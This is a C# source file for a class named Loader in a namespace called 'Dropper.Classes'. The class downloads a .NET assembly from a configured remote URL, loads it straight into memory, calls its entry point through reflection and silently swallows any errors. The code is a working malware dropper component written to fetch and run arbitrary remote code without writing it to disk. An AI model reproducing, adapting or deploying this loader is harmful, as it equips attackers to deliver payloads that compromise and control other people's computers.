using System.Net;
using System;
using System.Reflection;
using System.Configuration;

namespace Dropper.Classes
{
    public class Loader
    {
        private WebClient client;
        private byte[] assembly;

        public Loader() {
            client = new WebClient();            
        }

        public void loadBinary()
        {
            assembly = client.DownloadData(Settings.Download.DownloadURL);
            Assembly _assembly = Assembly.Load(assembly);

            MethodInfo method = _assembly.EntryPoint;

            var assemblyinstance = _assembly.CreateInstance(method.Name);

            try
            {
                method.Invoke(assemblyinstance, new object[] { });
            }
            catch { }
        }
    }
}